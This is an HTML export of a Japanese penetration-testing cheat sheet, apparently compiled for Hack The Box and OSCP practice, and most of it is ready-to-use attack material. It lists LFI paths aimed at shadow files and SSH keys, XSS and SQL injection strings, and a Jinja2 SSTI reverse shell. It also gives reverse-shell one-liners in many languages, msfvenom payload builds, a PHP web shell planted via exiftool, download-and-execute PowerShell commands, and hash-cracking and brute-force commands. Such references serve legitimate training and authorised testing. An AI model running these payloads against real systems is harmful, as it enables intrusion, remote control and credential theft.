<!DOCTYPE html>
<html>
<head>
<title>cheet.md</title>
<meta http-equiv="Content-type" content="text/html;charset=UTF-8">

<style>
/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

body {
	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
	font-size: var(--vscode-markdown-font-size, 14px);
	padding: 0 26px;
	line-height: var(--vscode-markdown-line-height, 22px);
	word-wrap: break-word;
}

#code-csp-warning {
	position: fixed;
	top: 0;
	right: 0;
	color: white;
	margin: 16px;
	text-align: center;
	font-size: 12px;
	font-family: sans-serif;
	background-color:#444444;
	cursor: pointer;
	padding: 6px;
	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
}

#code-csp-warning:hover {
	text-decoration: none;
	background-color:#007acc;
	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
}

body.scrollBeyondLastLine {
	margin-bottom: calc(100vh - 22px);
}

body.showEditorSelection .code-line {
	position: relative;
}

body.showEditorSelection .code-active-line:before,
body.showEditorSelection .code-line:hover:before {
	content: "";
	display: block;
	position: absolute;
	top: 0;
	left: -12px;
	height: 100%;
}

body.showEditorSelection li.code-active-line:before,
body.showEditorSelection li.code-line:hover:before {
	left: -30px;
}

.vscode-light.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(0, 0, 0, 0.15);
}

.vscode-light.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(0, 0, 0, 0.40);
}

.vscode-light.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-dark.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 255, 255, 0.4);
}

.vscode-dark.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 255, 255, 0.60);
}

.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-high-contrast.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 160, 0, 0.7);
}

.vscode-high-contrast.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 160, 0, 1);
}

.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

img {
	max-width: 100%;
	max-height: 100%;
}

a {
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

a:focus,
input:focus,
select:focus,
textarea:focus {
	outline: 1px solid -webkit-focus-ring-color;
	outline-offset: -1px;
}

hr {
	border: 0;
	height: 2px;
	border-bottom: 2px solid;
}

h1 {
	padding-bottom: 0.3em;
	line-height: 1.2;
	border-bottom-width: 1px;
	border-bottom-style: solid;
}

h1, h2, h3 {
	font-weight: normal;
}

table {
	border-collapse: collapse;
}

table > thead > tr > th {
	text-align: left;
	border-bottom: 1px solid;
}

table > thead > tr > th,
table > thead > tr > td,
table > tbody > tr > th,
table > tbody > tr > td {
	padding: 5px 10px;
}

table > tbody > tr + tr > td {
	border-top: 1px solid;
}

blockquote {
	margin: 0 7px 0 5px;
	padding: 0 16px 0 10px;
	border-left-width: 5px;
	border-left-style: solid;
}

code {
	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
	font-size: 1em;
	line-height: 1.357em;
}

body.wordWrap pre {
	white-space: pre-wrap;
}

pre:not(.hljs),
pre.hljs code > div {
	padding: 16px;
	border-radius: 3px;
	overflow: auto;
}

pre code {
	color: var(--vscode-editor-foreground);
	tab-size: 4;
}

/** Theming */

.vscode-light pre {
	background-color: rgba(220, 220, 220, 0.4);
}

.vscode-dark pre {
	background-color: rgba(10, 10, 10, 0.4);
}

.vscode-high-contrast pre {
	background-color: rgb(0, 0, 0);
}

.vscode-high-contrast h1 {
	border-color: rgb(0, 0, 0);
}

.vscode-light table > thead > tr > th {
	border-color: rgba(0, 0, 0, 0.69);
}

.vscode-dark table > thead > tr > th {
	border-color: rgba(255, 255, 255, 0.69);
}

.vscode-light h1,
.vscode-light hr,
.vscode-light table > tbody > tr + tr > td {
	border-color: rgba(0, 0, 0, 0.18);
}

.vscode-dark h1,
.vscode-dark hr,
.vscode-dark table > tbody > tr + tr > td {
	border-color: rgba(255, 255, 255, 0.18);
}

</style>

<style>
/* Tomorrow Theme */
/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
/* Original theme - https://github.com/chriskempson/tomorrow-theme */

/* Tomorrow Comment */
.hljs-comment,
.hljs-quote {
	color: #8e908c;
}

/* Tomorrow Red */
.hljs-variable,
.hljs-template-variable,
.hljs-tag,
.hljs-name,
.hljs-selector-id,
.hljs-selector-class,
.hljs-regexp,
.hljs-deletion {
	color: #c82829;
}

/* Tomorrow Orange */
.hljs-number,
.hljs-built_in,
.hljs-builtin-name,
.hljs-literal,
.hljs-type,
.hljs-params,
.hljs-meta,
.hljs-link {
	color: #f5871f;
}

/* Tomorrow Yellow */
.hljs-attribute {
	color: #eab700;
}

/* Tomorrow Green */
.hljs-string,
.hljs-symbol,
.hljs-bullet,
.hljs-addition {
	color: #718c00;
}

/* Tomorrow Blue */
.hljs-title,
.hljs-section {
	color: #4271ae;
}

/* Tomorrow Purple */
.hljs-keyword,
.hljs-selector-tag {
	color: #8959a8;
}

.hljs {
	display: block;
	overflow-x: auto;
	color: #4d4d4c;
	padding: 0.5em;
}

.hljs-emphasis {
	font-style: italic;
}

.hljs-strong {
	font-weight: bold;
}
</style>

<style>
/*
 * Markdown PDF CSS
 */

 body {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
	padding: 0 12px;
}

pre {
	background-color: #f8f8f8;
	border: 1px solid #cccccc;
	border-radius: 3px;
	overflow-x: auto;
	white-space: pre-wrap;
	overflow-wrap: break-word;
}

pre:not(.hljs) {
	padding: 23px;
	line-height: 19px;
}

blockquote {
	background: rgba(127, 127, 127, 0.1);
	border-color: rgba(0, 122, 204, 0.5);
}

.emoji {
	height: 1.4em;
}

code {
	font-size: 14px;
	line-height: 19px;
}

/* for inline code */
:not(pre):not(.hljs) > code {
	color: #C9AE75; /* Change the old color so it seems less like an error */
	font-size: inherit;
}

/* Page Break : use <div class="page"/> to insert page break
-------------------------------------------------------- */
.page {
	page-break-after: always;
}

</style>

<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</head>
<body>
  <script>
    mermaid.initialize({
      startOnLoad: true,
      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
          ? 'dark'
          : 'default'
    });
  </script>
<h1 id="%E3%83%9A%E3%83%8D%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%86%E3%82%B9%E3%83%88%E7%94%A8%E3%83%81%E3%83%BC%E3%83%88%E3%82%B7%E3%83%BC%E3%83%88">ペネトレーションテスト用チートシート</h1>
<p>Hack The Boxの攻略やOSCPの取得を目指して、まとめているチートシートです。<br>
随時更新して成長していきます。</p>
<script src="https://www.hackthebox.eu/badge/185549"></script>
<p>Twitter:@yukitsukai1731</p>
<h1 id="enum">Enum</h1>
<h2 id="ftp21">FTP(21)</h2>
<pre class="hljs"><code><div>ログインユーザの指定...user (ユーザ名) (パスワード)
ファイル転送モードを指定...type (転送モード)
</div></code></pre>
<table>
<thead>
<tr>
<th>コマンド</th>
<th>説明</th>
</tr>
</thead>
<tbody>
<tr>
<td>USER (username)<br>PASS (password)</td>
<td>ログイン情報の記述。</td>
</tr>
<tr>
<td>get (リモートファイル名) (ローカルファイル名)</td>
<td>サーバのファイルをパソコンに転送。</td>
</tr>
<tr>
<td>mget (リモートファイル名 [...])</td>
<td>サーバの複数のファイルをパソコンに転送。</td>
</tr>
<tr>
<td>mput (ローカルファイル名 [...])</td>
<td>パソコンの複数のファイルをサーバに転送。</td>
</tr>
<tr>
<td>put (ローカルファイル名) (リモートファイル名)</td>
<td>パソコンのファイルをサーバに転送。</td>
</tr>
<tr>
<td>type (転送モード)</td>
<td>現在のファイル転送モードを表示。</td>
</tr>
</tbody>
</table>
<h2 id="ssh22">SSH(22)</h2>
<h3 id="scp">SCP</h3>
<p>カレントディレクトリにsecret.zipをダウンロード</p>
<pre class="hljs"><code><div>kali@kali:$ scp charix@10.10.10.84:/home/charix/secret.zip .
</div></code></pre>
<h3 id="ssh%E3%83%9D%E3%83%BC%E3%83%88%E3%83%95%E3%82%A9%E3%83%AF%E3%83%BC%E3%83%87%E3%82%A3%E3%83%B3%E3%82%B0">SSHポートフォワーディング</h3>
<pre class="hljs"><code><div>kali@kali:$ ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
</div></code></pre>
<h3 id="ssh-keygen">ssh-keygen</h3>
<pre class="hljs"><code><div>ssh-keygen -t rsa -f id_rsa
chmod 600 id_rsa
</div></code></pre>
<ul>
<li>-t...暗号の種類(ed25519,rsaなど)</li>
<li>-b...ビット数の固定(-t rsa -b 4096など)</li>
<li>-f...ファイル名(id_????の?部分)</li>
</ul>
<h3 id="%E5%85%AC%E9%96%8B%E9%8D%B5%E8%AA%8D%E8%A8%BC">公開鍵認証</h3>
<pre class="hljs"><code><div>ssh -i id_rsa root@10.10.10.1
</div></code></pre>
<h2 id="dns53">DNS(53)</h2>
<p>未完了</p>
<h2 id="http80">HTTP(80)</h2>
<h3 id="nmap">Nmap</h3>
<pre class="hljs"><code><div>kali@kali:$ nmap -sC -sV -oN nmap/initial &lt;ipアドレス&gt;
</div></code></pre>
<pre class="hljs"><code><div>kali@kali:$ sudo nmap -T5 -p- -oN nmap/full &lt;ipアドレス&gt;
</div></code></pre>
<pre class="hljs"><code><div>kali@kali:$ nmap --script http-enum &lt;ipアドレス&gt;　-p 80
PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
</div></code></pre>
<h3 id="gobuster">Gobuster</h3>
<pre class="hljs"><code><div>gobuster dir -t 50 -u &lt;url&gt;  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,py -o &lt;output filename&gt; -k
</div></code></pre>
<p>-dir...ディレクトリ総当たり</p>
<ul>
<li>-t...スレッド数</li>
<li>-u...URL指定</li>
<li>-w...wordlistの指定</li>
<li>-o...ファイル出力</li>
<li>-x...拡張子指定</li>
<li>-k...Skip SSL</li>
<li>-s...ステータスコードの指定</li>
</ul>
<h3 id="ffuf">ffuf</h3>
<p>未完了</p>
<h3 id="nikto">Nikto</h3>
<pre class="hljs"><code><div>nikto -h &lt;url&gt; -Format txt -o &lt;output filename&gt;
</div></code></pre>
<ul>
<li>-h...url指定</li>
<li>Format...出力するファイルの拡張子を指定</li>
<li>-o...ファイルへ出力する</li>
<li>-ssl...SSLを使用するサイトで使用</li>
</ul>
<h3 id="wpscan">WPScan</h3>
<p>パッシブスキャン</p>
<pre class="hljs"><code><div>wpscan --update
wpscan --url &lt;url&gt; -e vp #脆弱なプラグイン特定
wpscan --url &lt;url&gt; -e vt #脆弱なTheme特定
wpscan --url &lt;url&gt; -e u #ユーザの列挙
wpscan --url &lt;url&gt; -e u -t -vp --log &lt;output filename&gt;
</div></code></pre>
<p>アグレッシブスキャン</p>
<pre class="hljs"><code><div>wpscan --url &lt;url&gt; -e vp --plugins-detection aggressive
</div></code></pre>
<ul>
<li>-url...対象のURL指定</li>
<li>-e u...usernameの列挙</li>
<li>-t...テーマを列挙</li>
<li>-vp...脆弱性のあるプラグインを列挙</li>
<li>--log...ファイル出力</li>
</ul>
<h4 id="%E3%83%AA%E3%82%B9%E3%83%88%E5%9E%8B%E6%94%BB%E6%92%83%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E6%8E%A8%E6%B8%AC%E6%94%BB%E6%92%83">リスト型攻撃/パスワード推測攻撃</h4>
<pre class="hljs"><code><div>wpscan --url &lt;url&gt; -U &lt;ユーザ名&gt; -P &lt;辞書ファイル&gt; --password-attack &lt;攻撃タイプ&gt;
#攻撃タイプ：wp-login,xmlrpc,xmlrpc-multicall
</div></code></pre>
<ul>
<li>--force...「but does not seem to be running WordPress」などが出た際に警告を無視して強制的に実行する</li>
</ul>
<h3 id="burpsuite">BurpSuite</h3>
<p>ローカルプロキシツール。<br>
通信の改ざんをするために使用。<br>
他にもXSSやSQLインジェクションなどの脆弱性を発見するために使う。<br>
LFIなどを利用する時にも使用。</p>
<p><img src="./image/2021-05-06-17-25-26.png" alt=""></p>
<h3 id="robotstxt%E3%81%AE%E7%A2%BA%E8%AA%8D">robots.txtの確認</h3>
<pre class="hljs"><code><div>curl http://&lt;IPアドレス&gt;robots.txt
</div></code></pre>
<h3 id="etchosts%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E7%B7%A8%E9%9B%86">/etc/hostsファイルの編集</h3>
<pre class="hljs"><code><div>sudo emacs /etc/hosts
10.10.10.1  admin.htb
</div></code></pre>
<h3 id="lfi">LFI</h3>
<pre class="hljs"><code><div>http://&lt;url&gt;/script.php?page=../../../../../../../../etc/passwd
http://&lt;url&gt;/script.php?page=../../../../../../../../etc/hosts
</div></code></pre>
<p>Examples:</p>
<pre class="hljs"><code><div>http://example.com/index.php?page=etc/passwd
http://example.com/index.php?page=etc/passwd%00
http://example.com/index.php?page=../../etc/passwd
http://example.com/index.php?page=%252e%252e%252f
http://example.com/index.php?page=....//....//etc/passwd
</div></code></pre>
<p>LFIを利用して読み取りを狙うファイル:<br>
Linux:</p>
<pre class="hljs"><code><div>/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
/home/user/.ssh/id_rsa
</div></code></pre>
<p>Windows:</p>
<pre class="hljs"><code><div>/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/S
</div></code></pre>
<h3 id="xss">XSS</h3>
<pre class="hljs"><code><div>&lt;script&gt;alert(1);&lt;/script&gt;
&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;XSS&lt;/a&gt;
&lt;iframe src=&quot;javascript:alert('XSS');&quot;&gt;&lt;/iframe&gt;
&lt;IMG SRC=j&amp;#X41vascript:alert('XSS')&gt;
</div></code></pre>
<h3 id="sql%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3">SQLインジェクション</h3>
<p>・後ろのスペースを入れて使用</p>
<pre class="hljs"><code><div>admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or ('1'='1--
'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
</div></code></pre>
<p>SQLmap:</p>
<pre class="hljs"><code><div>sqlmap -u http://192.168.56.1/vuln.php?id=1
sqlmap -u http：//192.168.0.1/vuln.php?id=1 --user-agent &quot;Mozilla / 5.0（X11; Linux x86_64; rv：60.0 ）Gecko / 20100101 Firefox / 60.0 &quot;
</div></code></pre>
<h3 id="ssti%E3%82%B5%E3%83%BC%E3%83%90%E3%82%B5%E3%82%A4%E3%83%89%E3%83%86%E3%83%B3%E3%83%97%E3%83%AC%E3%83%BC%E3%83%88%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3">SSTI(サーバサイドテンプレートインジェクション)</h3>
<p><img src="./image/2021-04-14-15-23-34.png" alt=""></p>
<p>・Jinja2(Reverse Shell)</p>
<pre class="hljs"><code><div>{% for x in ().__class__.__base__.__subclasses__() %}{% if &quot;warning&quot; in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(&quot;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;ip\&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/cat\&quot;, \&quot;flag.txt\&quot;]);'&quot;).read().zfill(417)}}{%endif%}{% endfor %}
</div></code></pre>
<h3 id="exiftools">exiftools</h3>
<p>・画像情報の表示</p>
<pre class="hljs"><code><div>exiftool image.jpg
</div></code></pre>
<p>・画像ファイルにexiftoolを用いてコメントにリバースシェルペイロードを記述</p>
<pre class="hljs"><code><div>exiftool -Comment=’&lt;?php echo “&lt;pre&gt;”; system($_GET[‘cmd’]); ?&gt;’ image.png
</div></code></pre>
<h3 id="steghide">steghide</h3>
<p>・ステガノグラフィー</p>
<pre class="hljs"><code><div>steghide extract -sf image.jpg
</div></code></pre>
<h3 id="cms">CMS</h3>
<ul>
<li>CMSの特定後、ログインページについて調査</li>
<li>その後、まずはデフォルトパスワードを入力</li>
<li>次にSQLインジェクションを試す</li>
<li>サーバ内で見つけたものなどを用いて、パスワード推測</li>
<li>最終的にHydraなどでブルートフォース</li>
</ul>
<p>・WordPress</p>
<pre class="hljs"><code><div>ログイン後、
1.[Appearance]→[Editor]→[404 Template(404.php)]を選択して編集
2.PentestMonkeyのphp-reverse-shellをコピーして上書き
3.netcatでリバースシェルを待ち受け
4.下記のようなアドレスにアクセス
  http://192.168.1.101/wordpress/wp-content/themes/twentyfifteen/404.php
</div></code></pre>
<p>・drupal</p>
<pre class="hljs"><code><div>MySQLに接続するための認証情報が記述されている
/var/www/html/sites/default/settings.php

$databases = array (
  'default' =&gt; 
  array (
    'default' =&gt; 
    array (
      'database' =&gt; 'drupal',
      'username' =&gt; 'drupaluser',
      'password' =&gt; 'CQHEy@9M*m23gBVj',
      'host' =&gt; 'localhost',
      'port' =&gt; '',
      'driver' =&gt; 'mysql',
      'prefix' =&gt; '',
    ),
  ),
);
</div></code></pre>
<h2 id="smb445">SMB(445)</h2>
<h3 id="smbclient">smbclient</h3>
<p>匿名ログインが有効になっているかの確認。</p>
<pre class="hljs"><code><div>smbclient -L &lt;target ip&gt;
</div></code></pre>
<h3 id="impacket">impacket</h3>
<p>ネットワークプロトコルを操作するためにPythonクラスのコレクション。<br>
SMB1-3やMSRPCなどのプロトコル実装自体を提供することに重点を置いている。<br>
ツールを利用する以外にもよくexploitに使われているので、インストールしておく必要がある。</p>
<pre class="hljs"><code><div>git clone https://github.com/SecureAuthCorp/impacket.git
pip install .
</div></code></pre>
<h4 id="impacket-smbserver">impacket-smbserver</h4>
<p>対象サーバにツールを送り込む際に使用。<br>
主にnetcatもpowershellも使えないようなときに使う。</p>
<pre class="hljs"><code><div>python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp &lt;共有するディレクトリ&gt;
</div></code></pre>
<pre class="hljs"><code><div>C:\WINDOWS\system32&gt;\\&lt;smbserverを立ち上げたIPアドレス&gt;\temp\whoami.exe
</div></code></pre>
<h3 id="smbmap">smbmap</h3>
<p>ドメイン全体のsamba共有ドライブを列挙するために使用。</p>
<pre class="hljs"><code><div>smbmap -u &lt;username&gt; -p &lt;password&gt; -H &lt;target host ip&gt;
</div></code></pre>
<h3 id="enum4linux">enum4linux</h3>
<p>WindowsおよびSambaホストからのデータを列挙するためのツール。</p>
<pre class="hljs"><code><div>enum4linux -U -o &lt;target ip&gt;
</div></code></pre>
<ul>
<li>-U...ユーザリスト取得</li>
<li>-o...OS情報取得</li>
</ul>
<h2 id="mysql3306">MySQL(3306)</h2>
<p>ログイン</p>
<pre class="hljs"><code><div>mysql -u root -p
mysql -u root -p -h &lt;host name&gt; -P &lt;port number&gt;
mysql -u root -e 'SHOW DATABASES;'
</div></code></pre>
<ul>
<li>-D...データベース名の指定</li>
<li>-e...コマンドラインから直接SQLコマンドを実行</li>
<li>-h... ホスト名の指定</li>
<li>-p...パスワードの指定</li>
<li>-u...ユーザー名の指定</li>
</ul>
<p>データベース一覧の表示</p>
<pre class="hljs"><code><div>mysql &gt; show databases;
</div></code></pre>
<p>データベースの追加</p>
<pre class="hljs"><code><div>mysql &gt; create database sample_db;
</div></code></pre>
<p>テーブル一覧の表示</p>
<pre class="hljs"><code><div>mysql &gt; show tables;
</div></code></pre>
<p>ユーザ情報取得</p>
<pre class="hljs"><code><div>SELECT Host, User, Password FROM mysql.user;
</div></code></pre>
<p>ユーザの追加</p>
<pre class="hljs"><code><div>create user &lt;追加するusername&gt;@&lt;host name&gt; IDENTIFIED BY &lt;password&gt;;
</div></code></pre>
<p>権限付与</p>
<pre class="hljs"><code><div>grant all privileges on test_db.* to &lt;username&gt;@&lt;host name&gt; IDENTIFIED BY &lt;password&gt;;
</div></code></pre>
<h1 id="exploitation">Exploitation</h1>
<h2 id="reverse-shell">Reverse Shell</h2>
<p>Bash:</p>
<pre class="hljs"><code><div>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
</div></code></pre>
<p>Python:</p>
<pre class="hljs"><code><div>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
</div></code></pre>
<p>Perl:</p>
<pre class="hljs"><code><div>perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
</div></code></pre>
<p>PHP:</p>
<pre class="hljs"><code><div>php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
&lt;?php echo system($_REQUEST [&quot;cmd&quot;]); ?&gt;
</div></code></pre>
<p>Ruby:</p>
<pre class="hljs"><code><div>ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
</div></code></pre>
<p>Netcat:</p>
<pre class="hljs"><code><div>nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
</div></code></pre>
<p>PowerShell:</p>
<pre class="hljs"><code><div>C:\Users\offsec&gt; powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient('10.
11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T
ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII
).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c
lient.Close()&quot;
</div></code></pre>
<h2 id="msfvenom">msfvenom</h2>
<p>Windows</p>
<pre class="hljs"><code><div>msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe &gt; reverse.exe
</div></code></pre>
<p>Windows(meterpreter):</p>
<pre class="hljs"><code><div>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
</div></code></pre>
<p>Linux:</p>
<pre class="hljs"><code><div>msfvenom -p linux/x64/shell_reverse_tcp RHOST=10.0.0.1 LPORT=4444 -f elf &gt; shell.elf
</div></code></pre>
<p>Linux(meterpreter):</p>
<pre class="hljs"><code><div>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
</div></code></pre>
<p>PHP:</p>
<pre class="hljs"><code><div>msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Port Number&gt; -f raw &gt; reverse.php
</div></code></pre>
<p>ASP:</p>
<pre class="hljs"><code><div>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip address&gt; LPORT=&lt;Port Number&gt; -f asp &gt; reverse.asp
</div></code></pre>
<p>JSP:</p>
<pre class="hljs"><code><div>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip address&gt; LPORT=&lt;Port Number&gt; -f raw &gt; reverse.jsp
</div></code></pre>
<p>WAR:</p>
<pre class="hljs"><code><div>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip address&gt; LPORT=&lt;Port Number&gt; -f war &gt; reverse.war
</div></code></pre>
<p>Python:</p>
<pre class="hljs"><code><div>msfvenom -p cmd/unix/reverse_python LHOST=&lt;ip address&gt; LPORT=&lt;Port Number&gt; -f raw &gt; reverse.py
</div></code></pre>
<p>Bash:</p>
<pre class="hljs"><code><div>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;ip address&gt; LPORT=&lt;Port Number&gt; -f raw &gt; reverse.sh
</div></code></pre>
<p>Perl:</p>
<pre class="hljs"><code><div>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;ip address&gt; LPORT=&lt;Port Number&gt; -f raw &gt; reverse.pl
</div></code></pre>
<h3 id="handlersmeterpreter">Handlers(meterpreter)</h3>
<pre class="hljs"><code><div>use exploit/multi/handler
set payload &lt;payload&gt;
set LHOST &lt;ip address&gt;
set LPORT &lt;port number&gt;
run
</div></code></pre>
<h1 id="python-httpserver">Python HttpServer</h1>
<p>攻撃者マシンでのサーバ立ち上げ。</p>
<pre class="hljs"><code><div>python -m SimpleHTTPServer &lt;ポート番号&gt;
python3 -m http.server &lt;ポート番号&gt;
</div></code></pre>
<h2 id="netcat">Netcat</h2>
<p>・ファイル転送</p>
<pre class="hljs"><code><div>送信側
nc &lt;攻撃者のIPアドレス&gt; 9999 &lt; filename

受信側
nc -l -p 9999 &gt; filename
</div></code></pre>
<p>・コマンドプロンプト</p>
<pre class="hljs"><code><div>C:\Users\offsec&gt; certutil -urlcache -split -f &quot;http://10.11.0.4/wget.exe&quot; wget.exe
</div></code></pre>
<p>・PowerShell</p>
<pre class="hljs"><code><div>#ダウンロード
C:\Users\offsec&gt; powershell -c (New-Object Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe', 'wget.exe')
C:\Users\offsec&gt; powershell -c Invoke-WebRequest &quot;http://10.10.14.2:80/taskkill.exe&quot; -OutFile &quot;taskkill.exe&quot;
C:\Users\offsec&gt; powershell -c wget &quot;http://10.10.14.2/nc.bat.exe&quot; -OutFile &quot;C:\ProgramData\unifivideo\taskkill.exe&quot;

#ダウンロード&amp;実行
powershell &quot;IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')&quot;
</div></code></pre>
<h2 id="searchsploit">searchsploit</h2>
<p>Exploit-dbを即座に検索できるツール。</p>
<pre class="hljs"><code><div>searchsploit &lt;keyword&gt;
</div></code></pre>
<p>ターミナル上でコードを閲覧。</p>
<pre class="hljs"><code><div>searchsploit - searchsploit -m windows/remote/39161.py
</div></code></pre>
<p>ローカルにコードやテキストをダウンロード。<br>
これでexploit用スクリプトをダウンロードする。</p>
<pre class="hljs"><code><div>searchsploit -m searchsploit -m windows/remote/39161.py
</div></code></pre>
<h2 id="hashcat">hashcat</h2>
<pre class="hljs"><code><div>hashcat -m 0 -a 0 &lt;パスワードファイル&gt;　/usr/share/wordlist/rockyou.txt
</div></code></pre>
<ul>
<li>-m 0 = MD5</li>
<li>-a 0 = 辞書攻撃</li>
</ul>
<p>Hash tyep:
https://hashcat.net/wiki/doku.php?id=example_hashes</p>
<h2 id="john-the-ripper">John The Ripper</h2>
<p>・zip</p>
<pre class="hljs"><code><div>zip2john a.zip &gt; hash.txt
john hash.txt 
or
john --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
</div></code></pre>
<p>・md5</p>
<pre class="hljs"><code><div>john --wordlist=/usr/share/wordlist/rockyou.txt --format=Raw-MD5 hash.txt
</div></code></pre>
<h2 id="hydra">hydra</h2>
<p>・http login</p>
<pre class="hljs"><code><div>hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form &quot;/department/login.php:username=^USER^&amp;password=^PASS^:Invalid Password!&quot;
</div></code></pre>
<p>・ssh
未完了</p>
<p>・ftp
未完了</p>
<h2 id="patator">patator</h2>
<p>未完了</p>
<h2 id="wordlist">Wordlist</h2>
<p>未完了</p>
<h2 id="aircrack-ng">aircrack-ng</h2>
<pre class="hljs"><code><div>airmon-ng start wlan0
iwaconfig
airodump-ng wlan0mon
</div></code></pre>
<pre class="hljs"><code><div>airodump-ng --channel 対象のチャンネル --bssid APのMACアドレス -w &lt;output filename&gt; wlan0mon
</div></code></pre>
<pre class="hljs"><code><div>aircrack-ng &lt;filename&gt;.cap
</div></code></pre>
